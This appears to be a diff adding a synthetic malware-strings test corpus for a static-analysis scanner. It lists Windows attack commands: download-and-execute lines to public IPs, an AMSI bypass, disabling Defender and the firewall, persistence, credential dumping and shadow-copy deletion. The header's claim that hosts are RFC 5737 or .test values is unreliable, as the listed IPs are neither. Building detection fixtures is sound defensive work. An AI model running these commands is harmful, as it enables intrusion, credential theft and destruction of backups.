@@ -1,0 +1,35 @@
+; ThreatLens static-analysis TEST CORPUS - synthetic sample, not live malware.
+; No runnable payload. Hosts are RFC 5737 / .test values. Do not weaponize.
+
+== extracted strings ==
+powershell -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA
+IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/stage2.ps1')
+(New-Object Net.WebClient).DownloadFile('http://185.220.101.45/gate.php','%TEMP%\svchost.exe')
+certutil -urlcache -split -f http://91.219.237.244/payload.dat payload.dat
+bitsadmin /transfer j http://91.219.237.244/p.exe %TEMP%\p.exe
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+AmsiScanBuffer
+amsiInitFailed
+AmsiUtils
+Set-MpPreference -DisableRealtimeMonitoring $true
+netsh advfirewall set allprofiles state off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /d "%TEMP%\svchost.exe" /f
+schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "%TEMP%\svchost.exe" /rl highest /f
+VirtualAllocEx
+WriteProcessMemory
+CreateRemoteThread
+NtUnmapViewOfSection
+QueueUserAPC
+sekurlsa::logonpasswords
+lsass.exe
+MiniDumpWriteDump
+C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Login Data
+vssadmin delete shadows /all /quiet
+wmic shadowcopy delete
+== network ==
+X-Malware-C2: http://45.147.230.112/gate.php
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko
+sleep=60000
+c2: http://185.220.101.45/panel/
+== embedded blob (base64, random - harmless) ==
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAOJh6FLDlmx+DTlv1wy1rlPvvO9/aGWOmahq8oLGCZWdRfE5hsis3VwAt7kBHs7dd+unHIW81PcVM/CTdVrELO8LdXcBTZfeFSOO8HLBMwtdJtcGid5cZnQ3805TKPU/e5i3PnauJ/tYaK0I5i/UxvlDCArsC3/zH/RtqZ8bWPGvmCi4Svd0cE4Msf7/YKLlxuQOdD/oVsXjQCiRpCSHN7DSyIdpAWKkezNFpvP+BxChoyFPq0+FIRG7IEqQ1F+MCAMoaDVDR2w9suqncaX1jpbeIUMMOT2v2qNHz2/S3zB/NTEAn1n2wxgGZnT/lF2PO8KYeBP3Lu3w8L5whyTODEBYxOXAizgWCGV38z8GtihfWQMztcHlkueGYao8n7AWi3peyUWZH92usfW1zLKUCUwrwEkTYOeiVvP/Ex/xwr4Miv0JKoo8bO9nmxDdyc1eL0ewDcnebFSilRDCe1HrnwHI+Uu62xT19T4n1j1xi5OPGJlhSWT0KabpJgrZEyCsMm8Amp8HghVPpJtUn3KcZstirhOpwZ9alk2K92RrXcoPJ3+/OfQ6s1xFTWddSA49vVatO7VKCFcI8kwEOdsR94rwq+1r4EcCBkuATLa5nQVZn1c9fyEBz9Jaw98OqhDwkpn7/Bp8uJMA68OjQIGJKiNTsF+DFIo8Q0JMWpC6XsaJkFMhYkE77XF32lU+yzmrIobX6ddv/niwXeZzXaoptnmgDuke4P86zkD/kAvWs3Dx8kikJi2kmmMtqCQwHTiBtYGCX85yU3wgSym0+w+8OQoruW/RHpQ9V9UK5vY5hD/jy9845qqY9IgQptuQ2cY8Y6GTZWRgonUKwS0n7ZQQE2Y/6mY1DAvnINARs81HKeS75icozlSb6LcUwid5QuNoQj0l/
